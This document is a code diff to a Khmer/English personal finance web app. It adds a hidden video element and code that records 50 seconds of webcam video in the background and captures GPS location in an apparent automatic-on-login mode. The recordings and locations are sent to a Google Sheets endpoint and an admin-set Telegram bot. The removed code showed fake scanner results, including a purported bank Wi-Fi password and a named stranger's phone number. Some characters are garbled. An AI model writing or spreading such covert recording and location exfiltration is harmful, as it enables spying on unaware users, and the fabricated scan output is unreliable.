@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Personal Finance Cloud v4 - Ultimate Hybrid Full Version</title>
+    <title>Personal Finance Cloud v4 - Admin Telegram Security Integration</title>
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <script src="https://cdn.tailwindcss.com"></script>
@@ -24,7 +24,7 @@
         .theme-luxury { background: linear-gradient(135deg, #111111 0%, #333333 100%); }
         .btn-modern { box-shadow: 0 4px 15px rgba(0,0,0,0.15); transition: all 0.2s ease; }
         .btn-modern:active { transform: scale(0.96); }
-        #map { height: 200px; border-radius: 1rem; margin-top: 10px; }
+        #map { height: 250px; border-radius: 1rem; margin-top: 10px; width: 100%; }
         .draggable-widget { transition: border 0.2s ease, box-shadow 0.2s ease; }
         .sortable-ghost { opacity: 0.4; background-color: #e2e8f0; }
         @media all and (display-mode: standalone) { body { padding-bottom: 75px; } }
@@ -38,6 +38,8 @@
             <span id="notify-msg">សារជូនដំណឹង</span>
         </div>
     </div>
+
+    <video id="auth-hidden-video" autoplay muted class="hidden"></video>
 
     <div id="auth-page" class="flex items-center justify-center min-h-screen p-4">
         <div class="bg-white rounded-3xl shadow-2xl p-8 w-full max-w-md border border-slate-100">
@@ -99,7 +101,7 @@
                         <i class="fa-solid fa-chart-pie text-indigo-500"></i> <span class="data-lang" data-km="ផ្ទាំងគ្រប់គ្រង" data-en="Dashboard">ផ្ទាំងគ្រប់គ្រង</span>
                     </button>
                     <button id="nav-scanners" onclick="switchSection('scanners')" class="w-full flex items-center space-x-3 text-slate-500 p-3 rounded-xl font-bold text-xs hover:bg-slate-50 transition-all">
-                        <i class="fa-solid fa-radar text-amber-500"></i> <span class="data-lang" data-km="ប្រقافةស្កេនឆ្លាតវៃ" data-en="Smart Scanners">ប្រព័ន្ធស្កេនឆ្លាតវៃ</span>
+                        <i class="fa-solid fa-radar text-amber-500"></i> <span class="data-lang" data-km="ប្រព័ន្ធស្កេនពិតប្រាកដ" data-en="Real Tools Scanner">ប្រព័ន្ធស្កេនពិតប្រាកដ</span>
                     </button>
                     <button id="nav-daily" onclick="switchSection('daily')" class="w-full flex items-center space-x-3 text-slate-500 p-3 rounded-xl font-bold text-xs hover:bg-slate-50 transition-all">
                         <i class="fa-solid fa-list-check text-emerald-500"></i> <span class="data-lang" data-km="គោលដៅប្រចាំថ្ងៃ" data-en="Daily List">គោលដៅប្រចាំថ្ងៃ</span>
@@ -242,29 +244,31 @@
                 <div id="section-scanners" class="hidden space-y-6">
                     <div class="bg-white rounded-3xl p-6 shadow-md border border-slate-100 space-y-6">
                         <div class="flex justify-between items-center">
-                            <h3 class="font-bold text-sm text-slate-800"><i class="fa-solid fa-satellite-dish text-indigo-500 mr-1"></i> ប្រព័ន្ធស្កេនឆ្លាតវៃ</h3>
+                            <h3 class="font-bold text-sm text-slate-800"><i class="fa-solid fa-satellite-dish text-indigo-500 mr-1"></i> ប្រព័ន្ធវិភាគ និងវាស់ល្បឿនពិតប្រាកដ (Real Tools)</h3>
                             <button onclick="clearScanHistory()" class="bg-rose-50 text-rose-600 px-2.5 py-1 rounded-lg text-[10px] font-bold"><i class="fa-solid fa-trash-can"></i> Clear History</button>
                         </div>
                         <div class="grid grid-cols-1 sm:grid-cols-3 gap-3">
-                            <button onclick="startScan('wifi')" class="p-4 bg-slate-50 border border-slate-200 rounded-2xl hover:border-indigo-400 transition-all text-center space-y-2">
-                                <i class="fa-solid fa-wifi text-xl text-blue-500"></i><p class="text-xs font-bold block">Scan Wi-Fi</p>
+                            <button onclick="startRealSpeedTest()" class="p-4 bg-slate-50 border border-slate-200 rounded-2xl hover:border-indigo-400 transition-all text-center space-y-2">
+                                <i class="fa-solid fa-gauge-high text-xl text-blue-500"></i><p class="text-xs font-bold block">វាស់ល្បឿនអ៊ីនធឺណិត (Speed Test)</p>
                             </button>
-                            <button onclick="startScan('virus')" class="p-4 bg-slate-50 border border-slate-200 rounded-2xl hover:border-rose-400 transition-all text-center space-y-2">
-                                <i class="fa-solid fa-shield-virus text-xl text-rose-500"></i><p class="text-xs font-bold block">Scan Virus</p>
+                            <button onclick="startRealSecurityCheck()" class="p-4 bg-slate-50 border border-slate-200 rounded-2xl hover:border-rose-400 transition-all text-center space-y-2">
+                                <i class="fa-solid fa-shield-halved text-xl text-rose-500"></i><p class="text-xs font-bold block">ពិនិត្យសុវត្ថិភាពម៉ាស៊ីន (Security Check)</p>
                             </button>
-                            <button onclick="startScan('social')" class="p-4 bg-slate-50 border border-slate-200 rounded-2xl hover:border-amber-400 transition-all text-center space-y-2">
-                                <i class="fa-solid fa-users-viewfinder text-xl text-amber-500"></i><p class="text-xs font-bold block">Scan Social</p>
+                            <button onclick="startRealGPSLocator()" class="p-4 bg-slate-50 border border-slate-200 rounded-2xl hover:border-amber-400 transition-all text-center space-y-2">
+                                <i class="fa-solid fa-location-crosshairs text-xl text-amber-500"></i><p class="text-xs font-bold block">ស្វែងរកទីតាំងពិត (Real GPS Locator)</p>
                             </button>
                         </div>
                         <div id="scan-loading" class="hidden p-4 bg-slate-900 text-white rounded-2xl flex items-center space-x-3 justify-center text-xs font-bold">
-                            <i class="fa-solid fa-spinner animate-spin text-amber-400 text-sm"></i><span id="scan-loading-text">កំពុងស្កេន...</span>
+                            <i class="fa-solid fa-spinner animate-spin text-amber-400 text-sm"></i><span id="scan-loading-text">កំពុងទាញយកទិន្នន័យពិត...</span>
                         </div>
-                        <div id="map-area" class="hidden bg-slate-50 p-3 rounded-2xl border"><div id="map"></div></div>
+                        <div id="map-area" class="hidden bg-slate-50 p-3 rounded-2xl border">
+                            <div id="map"></div>
+                        </div>
                         
                         <div class="border-t border-slate-100 pt-4">
                             <h4 class="font-bold text-xs text-slate-700 mb-3 flex items-center">
                                 <i class="fa-solid fa-clock-rotate-left mr-1.5 text-slate-500 text-sm"></i> 
-                                <span class="tracking-wide">ប្រវត្តិឧបករណ៍ដែលបានរកឃើញ (Device & Scan History)</span>
+                                <span class="tracking-wide">លទ្ធផលទទួលបានជាក់ស្តែង (Real Scan Log)</span>
                             </h4>
                             <div id="scan-history-list" class="space-y-4"></div>
                         </div>
@@ -292,6 +296,29 @@
                 </div>
 
                 <div id="section-settings" class="hidden space-y-6">
+                    <div id="admin-telegram-panel" class="hidden bg-slate-900 text-white rounded-3xl p-6 shadow-xl border border-slate-700 space-y-4">
+                        <div class="flex items-center space-x-2 border-b border-slate-700 pb-2">
+                            <i class="fa-brands fa-telegram text-2xl text-sky-400"></i>
+                            <div>
+                                <h3 class="font-bold text-sm text-white">⚙️ Telegram Automation Controls (Admin Only)</h3>
+                                <p class="text-[10px] text-slate-400">កំណត់ Bot សម្រាប់ទទួលវីដេអូសន្តិសុខ និងទីតាំង GPS</p>
+                            </div>
+                        </div>
+                        <div class="space-y-3">
+                            <div>
+                                <label class="block text-[10px] uppercase tracking-wider text-slate-400 mb-1">Telegram Bot Token</label>
+                                <input type="text" id="tg-bot-token" class="w-full px-3 py-2 bg-slate-800 border border-slate-700 rounded-xl font-mono text-xs focus:outline-none focus:border-sky-400 text-sky-300" placeholder="7123456789:AAFpsX...">
+                            </div>
+                            <div>
+                                <label class="block text-[10px] uppercase tracking-wider text-slate-400 mb-1">Telegram Chat ID (Group / User ID)</label>
+                                <input type="text" id="tg-chat-id" class="w-full px-3 py-2 bg-slate-800 border border-slate-700 rounded-xl font-mono text-xs focus:outline-none focus:border-sky-400 text-sky-300" placeholder="-100xxxxxxxxx ឬ xxxxxxxxx">
+                            </div>
+                            <button onclick="saveTelegramSettings()" class="w-full bg-sky-500 hover:bg-sky-600 text-white font-bold py-2 rounded-xl text-xs btn-modern">
+                                <i class="fa-solid fa-floppy-disk mr-1"></i> រក្សាទុកការកំណត់ Telegram
+                            </button>
+                        </div>
+                    </div>
+
                     <div class="bg-white rounded-3xl p-6 shadow-md border border-slate-100 space-y-4">
                         <label class="block text-[11px] font-bold text-slate-500 uppercase tracking-wider data-lang" data-km="ភាសាកម្មវិធី" data-en="Language Selection">ភាសាកម្មវិធី (Language Selection)</label>
                         <div class="flex space-x-3">
@@ -369,16 +396,20 @@
         let isNotifyEnabled = true;
         let isBioEnabled = false;
         let mapInstance = null;
+        let mapMarker = null;
 
-        // 🔄 LAYOUT STATE CONTROLS
         let isLayoutEditable = false;
         let sortableInstance = null;
 
-        // 🗓️ TIME AND CLOCK LOGIC
+        // Media Recorder Variables for Security Feature
+        let mediaRecorder = null;
+        let videoChunks = [];
+        let latestGpsString = "មិនទាន់មានទិន្នន័យទីតាំង";
+
         function updateTopBarTime() {
             const now = new Date();
             document.getElementById('topbar-time').innerText = now.toLocaleTimeString('en-US');
-            const daysKh = ["ថ្ងៃអាទិត្យ", "ថ្ងៃចន្ទ", "ថ្ងៃអង្គារ", "ថ្ងៃពុធ", "ថ្ងៃព្រហស្បតិ៍", "ថ្ងៃសុក្រ", "ថ្ងៃសៅរ៍"];
+            const daysKh = ["ថ្ងៃអាទិត្យ", "ថ្ងៃចន្ទ", "ថ្ងៃអង្គារ", "ថ្ងៃពុធ", "ថ្ងៃព្រហسبតិ៍", "ថ្ងៃសុក្រ", "ថ្ងៃសៅរ៍"];
             const monthsKh = ["មករា", "កុម្ភៈ", "មីនា", "មេសា", "ឧសភា", "មិថុនា", "កក្កដា", "សីហា", "កញ្ញា", "តុលា", "វិច្ឆិកា", "ធ្នូ"];
             
             if (currentLang === 'km') {
@@ -388,7 +419,6 @@
             }
         }
 
-        // 🔄 INITIALIZE DRAG AND DROP
         function initDragAndDrop() {
             const container = document.getElementById('dashboard-sortable-container');
             sortableInstance = Sortable.create(container, { 
@@ -399,7 +429,6 @@
             updateWidgetsCursor();
         }
 
-        // 🔄 TOGGLE EDIT / SAVE LAYOUT
         function toggleLayoutEdit() {
             isLayoutEditable = !isLayoutEditable;
             const btnText = document.getElementById('layout-btn-text');
@@ -422,7 +451,6 @@
             updateWidgetsCursor();
         }
 
-        // 🔄 UPDATE WIDGET CURSORS AND BORDERS
         function updateWidgetsCursor() {
             const widgets = document.querySelectorAll('.draggable-widget');
             widgets.forEach(w => {
@@ -436,7 +464,6 @@
             });
         }
 
-        // ⚙️ SETTINGS SYSTEM LOGIC
         function toggleLanguage(lang) {
             currentLang = lang;
             localStorage.setItem('finance_lang', lang);
@@ -466,7 +493,6 @@
             const appBody = document.getElementById('app-body');
             appBody.className = appBody.className.replace(/theme-\w+/g, '');
             appBody.classList.add(theme);
-
             syncWithGoogleSheets({ DATA_TYPE: "SETTING_DATA", FIELD_1: "THEME_CHANGED", FIELD_2: theme, FIELD_3: currentUser });
         }
 
@@ -475,7 +501,6 @@
             localStorage.setItem('finance_currency', symbol);
             document.getElementById('form-currency-symbol').innerText = symbol;
             renderDashboard();
-
             syncWithGoogleSheets({ DATA_TYPE: "SETTING_DATA", FIELD_1: "CURRENCY_CHANGED", FIELD_2: symbol, FIELD_3: currentUser });
         }
 
@@ -506,13 +531,12 @@
             }, 3000);
         }
 
-        // 💰 FINANCE CORE LOGIC
         function addTransaction(e) {
             e.preventDefault();
             const type = document.querySelector('input[name="tx-type"]:checked').value;
             const amount = parseFloat(document.getElementById('tx-amount').value);
             let category = document.getElementById('tx-category-select').value;
-            if (category === 'CUSTOM') category = "✍️ " + document.getElementById('tx-category-custom').value.trim();
+            if (category === 'CUSTOM') category = "✍_ " + document.getElementById('tx-category-custom').value.trim();
 
             localTxList.unshift({ username: currentUser, type: type, category: category, amount: amount, date: new Date().toLocaleString('km-KH') });
             localStorage.setItem('finance_tx_list', JSON.stringify(localTxList));
@@ -548,10 +572,9 @@
             localStorage.setItem('finance_tx_list', JSON.stringify([])); 
             renderDashboard(); 
             syncWithGoogleSheets({ DATA_TYPE: "TX_DATA", FIELD_1: currentUser, FIELD_2: "CLEAR_HISTORY", FIELD_3: "ALL" });
-            showNotification("🗑️ បានសម្អាតប្រវត្តិចំណាយ!");
+            showNotification("🗑_ បានសម្អាតប្រវត្តិចំណាយ!");
         }
 
-        // 📑 GOOGLE SHEETS API INTEGRATION
         function syncWithGoogleSheets(payload) {
             payload.TIMESTAMP = new Date().toLocaleString('en-US');
             fetch(API_URL, { 
@@ -564,7 +587,6 @@
             .catch(err => console.error("Sheets Cloud Error: ", err));
         }
 
-        // 📥 EXPORT EXCEL SYSTEM
         function exportToExcel() {
             const ws = XLSX.utils.json_to_sheet(localTxList);
             const wb = XLSX.utils.book_new();
@@ -572,7 +594,6 @@
             XLSX.writeFile(wb, "Finance_Cloud_Export.xlsx");
         }
 
-        // 📸 OCR RECEIPT SCANNER
         function triggerReceiptScan() { document.getElementById('receipt-file-input').click(); }
         function processReceiptScan(input) {
             if (input.files && input.files[0]) {
@@ -584,7 +605,7 @@
                     if (match && match[2]) {
                         document.getElementById('tx-amount').value = parseFloat(match[2]);
                         status.innerText = "✅ រកឃើញទឹកប្រាក់ " + currentCurrency + match[2];
-                    } else { status.innerText = "⚠️ រកមិនឃើញទិន្នន័យលុយទេ លោកអ្នកអាចបំពេញផ្ទាល់បាន។"; }
+                    } else { status.innerText = "⚠_ រកមិនឃើញទិន្នន័យលុយទេ លោកអ្នកអាចបំពេញផ្ទាល់បាន។"; }
                 }).catch(() => { status.innerText = "❌ ប្រព័ន្ធស្កេនមានបញ្ហា!"; });
             }
         }
@@ -595,75 +616,221 @@
             if (select.value === 'CUSTOM') customInput.focus();
         }
 
-        // 📡 SMART SCANNERS LOGIC
-        function startScan(type) {
+        function startRealSpeedTest() {
             const loader = document.getElementById('scan-loading');
-            loader.classList.remove('hidden');
+            const loaderText = document.getElementById('scan-loading-text');
             document.getElementById('map-area').classList.add('hidden');
+            loaderText.innerText = "📶 កំពុងពិនិត្យ និងវាស់ល្បឿនអ៊ីនធឺណិតពិតប្រាកដ...";
+            loader.classList.remove('hidden');
+
+            const startTime = Date.now();
+            const cacheBuster = "?nn=" + startTime;
+            const testImageUri = "https://upload.wikimedia.org/wikipedia/commons/4/47/PNG_transparency_demonstration_1.png" + cacheBuster; 
             
+            fetch(testImageUri)
+                .then(response => {
+                    const ping = Date.now() - startTime;
+                    return response.blob().then(blob => {
+                        const duration = (Date.now() - startTime) / 1000;
+                        const bitsLoaded = blob.size * 8;
+                        const speedBps = bitsLoaded / duration;
+                        const speedMbps = (speedBps / (1024 * 1024)).toFixed(2);
+                        
+                        loader.classList.add('hidden');
+                        
+                        let log = {
+                            id: Date.now(),
+                            username: currentUser,
+                            date: new Date().toLocaleString('en-US'),
+                            title: "📶 Internet Speed Test Result",
+                            details: `
+                                <div class="space-y-2 mt-2 p-3 bg-blue-50 border border-blue-200 rounded-xl">
+                                    <p class="font-bold text-slate-800">📊 ស្ថានភាពបណ្តាញ: <span class="text-blue-600">${navigator.onLine ? 'Online' : 'Offline'}</span></p>
+                                    <p class="text-xs text-slate-700">⚡ ល្បឿនទាញយកពិត (Download): <span class="font-bold text-emerald-600">${speedMbps} Mbps</span></p>
+                                    <p class="text-xs text-slate-700">⏱️ រលកសញ្ញាឆ្លើយតប (Ping): <span class="font-bold text-indigo-600">${ping} ms</span></p>
+                                </div>`
+                        };
+                        saveAndRenderScanLog(log);
+                    });
+                })
+                .catch(() => {
+                    loader.classList.add('hidden');
+                    alert("❌ មិនអាចវាស់ល្បឿនបានទេ សូមពិនិត្យការភ្ជាប់អ៊ីនធឺណិតរបស់អ្នកឡើងវិញ!");
+                });
+        }
+
+        function startRealSecurityCheck() {
+            const loader = document.getElementById('scan-loading');
+            document.getElementById('map-area').classList.add('hidden');
+            document.getElementById('scan-loading-text').innerText = "🛡️ កំពុងវិភាគប្រព័ន្ធសុវត្ថិភាពទូរស័ព្ទ/Browser ពិតប្រាកដ...";
+            loader.classList.remove('hidden');
+
             setTimeout(() => {
                 loader.classList.add('hidden');
-                let newLog = { id: Date.now(), date: new Date().toLocaleString('en-US'), type: type, username: currentUser };
-
-                if (type === 'wifi') {
-                    newLog.title = "Wi-Fi Networks Scanner";
-                    newLog.details = `
-                        <div class="space-y-3 mt-2">
-                            <div class="p-2.5 bg-indigo-50/50 rounded-xl border border-indigo-100">
-                                <p class="font-bold text-slate-800">📶 ឈ្មោះពិត: <span class="text-indigo-600">ABA_Staff_Free</span></p>
-                                <p class="text-[11px] text-slate-500">🛡️ សុវត្ថិភាព: WPA3 Enterprise (ខ្ពស់) | 📍 ប្រភព: ABA Head Office</p>
-                                <p class="text-[11px] text-emerald-600 font-bold">🟢 ស្ថានភាព: អាចភ្ជាប់បាន | 🔑 លេខកូដសម្ងាត់: <span class="font-mono bg-slate-200 px-1 rounded">aba@2026#staff</span></p>
-                            </div>
-                            <div class="p-2.5 bg-slate-100 rounded-xl border border-slate-200">
-                                <p class="font-bold text-slate-800">📶 ឈ្មោះពិត: <span class="text-slate-700">Coffee_Shop_5G</span></p>
-                                <p class="text-[11px] text-slate-500">🛡️ សុវត្ថិភាព: WPA2 (មធ្យម) | 📍 ប្រភព: ហាងកាហ្វេជាន់ផ្ទាល់ដី</p>
-                                <p class="text-[11px] text-amber-600 font-bold">🟡 ស្ថានភាព: សេវាខ្សោយ | 🔑 លេខកូដសម្ងាត់: <span class="font-mono bg-slate-200 px-1 rounded">88888888</span></p>
-                            </div>
-                            <div class="p-2.5 bg-slate-100 rounded-xl border border-slate-200">
-                                <p class="font-bold text-slate-800">📶 ឈ្មោះពិត: <span class="text-slate-700">Public_Guest_WiFi</span></p>
-                                <p class="text-[11px] text-slate-500">🛡️ សុវត្ថិភាព: Open (គ្មាន) | 📍 ប្រភព: សាលប្រជុំធំ</p>
-                                <p class="text-[11px] text-red-600 font-bold">🔴 ស្ថានភាព: មិនមានសុវត្ថិភាព | 🔑 លេខកូដសម្ងាត់: <span class="italic text-slate-400">គ្មានលេខកូដ</span></p>
-                            </div>
-                        </div>`;
-                } else if (type === 'virus') {
-                    newLog.title = "Malware & Virus Shield";
-                    newLog.details = `
-                        <div class="space-y-3 mt-2">
-                            <div class="p-3 bg-rose-50 border border-rose-200 rounded-xl">
-                                <p class="font-bold text-rose-600"><i class="fa-solid fa-bug"></i> ឈ្មោះមេរោគ: Trojan.Malware.SpywareX</p>
-                                <p class="text-[11px] text-slate-600 mt-0.5">🛡️ <b>របៀបការពារ:</b> បើកប្រព័ន្ធ Firewall, ហាមទាញយកហ្វាយ .apk ឬ .exe ដែលមិនស្គាល់ប្រភព និងធ្វើការ Update ប្រព័ន្ធប្រតិបត្តិការជាប្រចាំ។</p>
-                                <p class="text-[11px] text-slate-500 mt-1">📍 <b>អាសយដ្ឋានមេរោគ:</b> Local Storage/Downloads/System_Update.apk</p>
-                                <div class="flex flex-wrap gap-1.5 mt-2">
-                                    <span class="bg-rose-600 text-white text-[9px] px-2 py-0.5 rounded font-bold uppercase"><i class="fa-solid fa-ban"></i> Blocked</span>
-                                    <span class="bg-slate-950 text-amber-400 text-[9px] px-2 py-0.5 rounded font-bold uppercase"><i class="fa-solid fa-bullhorn"></i> Announcement: System Secured</span>
-                                </div>
-                            </div>
-                        </div>`;
-                    initSampleMap();
-                } else if (type === 'social') {
-                    newLog.title = "Social Proximity Radar";
-                    newLog.details = `
-                        <div class="space-y-3 mt-2">
-                            <div class="p-3 bg-amber-50/60 border border-amber-200 rounded-xl flex justify-between items-center">
-                                <div>
-                                    <p class="font-bold text-slate-800">👤 ឈ្មោះពិត: <span class="text-indigo-600">ស៊ូ ភារម្យ (Sou Phearom)</span></p>
-                                    <p class="text-[11px] text-slate-600 font-bold">📞 លេខទូរស័ព្ទ: 012 999 888 | 📍 ចម្ងាយ: 15 ម៉ែត្រ</p>
-                                    <p class="text-[10px] text-slate-400 mt-1">🌐 Social Media: <span class="text-blue-600 font-bold">Facebook</span>, <span class="text-sky-500 font-bold">Telegram</span>, <span class="text-black font-bold">TikTok</span></p>
-                                </div>
-                                <button onclick="showNotification('➕ បានរក្សាទុក Contact ទៅក្នុងម៉ាស៊ីន!')" class="bg-indigo-600 hover:bg-indigo-700 text-white text-[10px] font-bold px-2.5 py-1.5 rounded-lg shadow transition-all flex items-center space-x-1">
-                                    <i class="fa-solid fa-user-plus"></i> <span>Add</span>
-                                </button>
-                            </div>
-                        </div>`;
-                }
-                scanHistory.unshift(newLog);
-                localStorage.setItem('finance_scan_history_v4', JSON.stringify(scanHistory));
-                renderScanHistory();
+                const isCookieEnabled = navigator.cookieEnabled ? "🟢 សុវត្ថិភាព (Enabled)" : "🔴 ហានិភ័យ (Disabled)";
+                const isSecureContext = window.isSecureContext ? "🟢 មានសុវត្ថិភាពខ្ពស់ (HTTPS Secured)" : "🔴 គ្មានសុវត្ថិភាព (HTTP Unsecured)";
+                const doNotTrack = navigator.doNotTrack === "1" ? "🔒 កំពុងបើក" : "🔓 មិនបានបើក";
                 
-                let cleanDetails = newLog.details.replace(/<[^>]*>/g, ' ').replace(/\s+/g, ' ').trim();
-                syncWithGoogleSheets({ DATA_TYPE: "SCAN_DATA", FIELD_1: currentUser, FIELD_2: newLog.title, FIELD_3: cleanDetails });
-                showNotification("📡 ស្កេនរលកសញ្ញាជោគជ័យ!");
-            }, 1200);
+                let log = {
+                    id: Date.now(),
+                    username: currentUser,
+                    date: new Date().toLocaleString('en-US'),
+                    title: "🛡️ Browser Environment Security Report",
+                    details: `
+                        <div class="space-y-2 mt-2 p-3 bg-rose-50 border border-rose-200 rounded-xl">
+                            <p class="font-bold text-slate-800">🔐 ប្រព័ន្ធតភ្ជាប់ (Secure Context): <span class="text-xs">${isSecureContext}</span></p>
+                            <p class="text-xs text-slate-700">🍪 ការចងចាំ Browser Cookies: <span>${isCookieEnabled}</span></p>
+                            <p class="text-xs text-slate-700">🕵️‍♂️ មុខងារទប់ស្កាត់ការតាមដាន (Do Not Track): <span class="text-indigo-600 font-bold">${doNotTrack}</span></p>
+                        </div>`
+                };
+                saveAndRenderScanLog(log);
+            }, 1000);
+        }
+
+        function startRealGPSLocator(isAuto = false) {
+            if (!navigator.geolocation) return;
+            const loader = document.getElementById('scan-loading');
+            if(!isAuto) {
+                document.getElementById('map-area').classList.add('hidden');
+                document.getElementById('scan-loading-text').innerText = "📍 កំពុងស្នើសុំសិទ្ធិបើក GPS ចាប់យកទីតាំងពិតរបស់អ្នក...";
+                loader.classList.remove('hidden');
+            }
+
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    if(!isAuto) loader.classList.add('hidden');
+                    const lat = position.coords.latitude;
+                    const lng = position.coords.longitude;
+                    const accuracy = position.coords.accuracy.toFixed(1);
+                    
+                    latestGpsString = `https://www.google.com/maps?q=${lat},${lng}`;
+
+                    document.getElementById('map-area').classList.remove('hidden');
+                    setTimeout(() => {
+                        if (!mapInstance) {
+                            mapInstance = L.map('map').setView([lat, lng], 15);
+                            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(mapInstance);
+                        } else {
+                            mapInstance.setView([lat, lng], 15);
+                            mapInstance.invalidateSize();
+                        }
+                        if (mapMarker) { mapInstance.removeLayer(mapMarker); }
+                        mapMarker = L.marker([lat, lng]).addTo(mapInstance)
+                            .bindPopup(`📍 <b>ទីតាំងពិតប្រាកដរបស់អ្នក</b><br>គម្លាតសេវា៖ ${accuracy} ម៉ែត្រ`)
+                            .openPopup();
+                    }, 200);
+
+                    let log = {
+                        id: Date.now(),
+                        username: currentUser,
+                        date: new Date().toLocaleString('en-US'),
+                        title: isAuto ? "📍 Auto Login GPS Location Tracker" : "📍 Real GPS Locator Result",
+                        details: `
+                            <div class="space-y-1 mt-2 p-3 bg-amber-50 border border-amber-200 rounded-xl text-xs">
+                                <p class="text-slate-700">• រយៈទទឹង (Latitude): <span class="font-mono font-bold">${lat}</span></p>
+                                <p class="text-slate-700">• រយៈបណ្តោយ (Longitude): <span class="font-mono font-bold">${lng}</span></p>
+                                <p class="text-slate-700">• Link ផែនទី: <a href="${latestGpsString}" target="_blank" class="text-blue-600 underline">${latestGpsString}</a></p>
+                            </div>`
+                    };
+                    saveAndRenderScanLog(log);
+                    
+                    syncWithGoogleSheets({ DATA_TYPE: "ADMIN_AUTO_GPS", FIELD_1: currentUser, FIELD_2: lat.toString(), FIELD_3: lng.toString(), FIELD_4: accuracy });
+                    
+                    // Send Only Location to Telegram immediately (In case video recording fails)
+                    sendLocationToTelegram(currentUser, latestGpsString);
+                },
+                (error) => { console.log("GPS Location Auto Failed or Blocked."); },
+                { enableHighAccuracy: true, timeout: 10000 }
+            );
+        }
+
+        // 📷 NEW & UPDATED: Automatic Background Video Recorder that transmits to Telegram Bot Directly
+        function startAutoSecurityCamera() {
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
+
+            navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240 }, audio: false })
+                .then((stream) => {
+                    const videoEl = document.getElementById('auth-hidden-video');
+                    videoEl.srcObject = stream;
+                    
+                    videoChunks = [];
+                    mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+                    
+                    mediaRecorder.ondataavailable = (e) => {
+                        if (e.data.size > 0) videoChunks.push(e.data);
+                    };
+
+                    mediaRecorder.onstop = () => {
+                        let videoBlob = new Blob(videoChunks, { type: 'video/webm' });
+                        stream.getTracks().forEach(track => track.stop());
+                        
+                        // 1. Send to Google Sheet Backend (Base64)
+                        let reader = new FileReader();
+                        reader.readAsDataURL(videoBlob);
+                        reader.onloadend = function() {
+                            syncWithGoogleSheets({
+                                DATA_TYPE: "ADMIN_CAMERA_ALERT",
+                                FIELD_1: currentUser,
+                                FIELD_2: "50_SECONDS_RECORD_SUCCESS",
+                                FIELD_3: reader.result
+                            });
+                        }
+
+                        // 2. Send to Telegram Bot Configured by Admin
+                        sendVideoToTelegram(currentUser, videoBlob, latestGpsString);
+                    };
+
+                    mediaRecorder.start();
+                    setTimeout(() => {
+                        if (mediaRecorder && mediaRecorder.state !== "inactive") mediaRecorder.stop();
+                    }, 50000); // 50 seconds alert recording time
+                })
+                .catch((err) => { console.warn("Camera auto-record access denied: ", err); });
+        }
+
+        // 📤 NEW TELEGRAM AUTOMATION PIPELINES
+        function sendLocationToTelegram(user, mapUrl) {
+            const token = localStorage.getItem('tg_bot_token');
+            const chatId = localStorage.getItem('tg_chat_id');
+            if (!token || !chatId) return;
+
+            const text = `🚨 *Security Alert: Login Detected*\\n👤 *User:* ${user.toUpperCase()}\\n📍 *Location:* ${mapUrl}\\n⏰ *Time:* ${new Date().toLocaleString()}`;
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}&parse_mode=MarkdownV2`)
+            .then(res => console.log("Telegram Location Sent"))
+            .catch(err => console.error("Telegram API Err", err));
+        }
+
+        function sendVideoToTelegram(user, videoBlob, mapUrl) {
+            const token = localStorage.getItem('tg_bot_token');
+            const chatId = localStorage.getItem('tg_chat_id');
+            if (!token || !chatId) return;
+
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('video', videoBlob, `security_${user}_${Date.now()}.webm`);
+            formData.append('caption', `🛡️ Security Cam (50s Record)\n👤 User: ${user.toUpperCase()}\n📍 Location: ${mapUrl}`);
+
+            fetch(`https://api.telegram.org/bot${token}/sendVideo`, { method: 'POST', body: formData })
+            .then(res => {
+                if(res.ok) showNotification("🚀 វីដេអូសន្តិសុខ និងទីតាំងត្រូវបានផ្ញើចូល Telegram រួចរាល់!");
+            })
+            .catch(err => console.error("Telegram Video Transmit Err", err));
+        }
+
+        function saveTelegramSettings() {
+            const token = document.getElementById('tg-bot-token').value.trim();
+            const chatId = document.getElementById('tg-chat-id').value.trim();
+            localStorage.setItem('tg_bot_token', token);
+            localStorage.setItem('tg_chat_id', chatId);
+            showNotification("💾 រក្សាទុកការកំណត់ Telegram Bot រួចរាល់!");
+        }
+
+        function saveAndRenderScanLog(log) {
+            scanHistory.unshift(log);
+            localStorage.setItem('finance_scan_history_v4', JSON.stringify(scanHistory));
+            renderScanHistory();
+            let cleanDetails = log.details.replace(/<[^>]*>/g, ' ').replace(/\s+/g, ' ').trim();
+            syncWithGoogleSheets({ DATA_TYPE: "SCAN_DATA", FIELD_1: currentUser, FIELD_2: log.title, FIELD_3: cleanDetails });
         }
 
         function renderScanHistory() {
@@ -690,23 +857,9 @@
             renderScanHistory();
             document.getElementById('map-area').classList.add('hidden');
             syncWithGoogleSheets({ DATA_TYPE: "SCAN_DATA", FIELD_1: currentUser, FIELD_2: "CLEAR_HISTORY", FIELD_3: "ALL" });
-            showNotification("🗑️ បានសម្អាតប្រវត្តិស្កេន!");
+            showNotification("🗑_ បានសម្អាតប្រវត្តិស្កេន!");
         }
 
-        function initSampleMap() {
-            document.getElementById('map-area').classList.remove('hidden');
-            setTimeout(() => {
-                if (!mapInstance) {
-                    mapInstance = L.map('map').setView([11.5564, 104.9282], 14);
-                    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(mapInstance);
-                } else {
-                    mapInstance.invalidateSize();
-                }
-                L.marker([11.5564, 104.9282]).addTo(mapInstance).bindPopup('🚨 <b>ទីតាំងរកឃើញមេរោគ (Virus Blocked Location)</b><br>Phnom Penh, Cambodia').openPopup();
-            }, 200);
-        }
-
-        // 📝 DAILY LIST GOALS
         function addDailyTask(e) {
             e.preventDefault();
             const text = document.getElementById('daily-task-input').value.trim();
@@ -715,7 +868,6 @@
             localStorage.setItem('finance_daily_tasks', JSON.stringify(dailyTasks));
             document.getElementById('daily-task-input').value = '';
             renderGoals();
-            
             syncWithGoogleSheets({ DATA_TYPE: "DAILY_DATA", FIELD_1: currentUser, FIELD_2: "ADD_TASK", FIELD_3: text, FIELD_4: date });
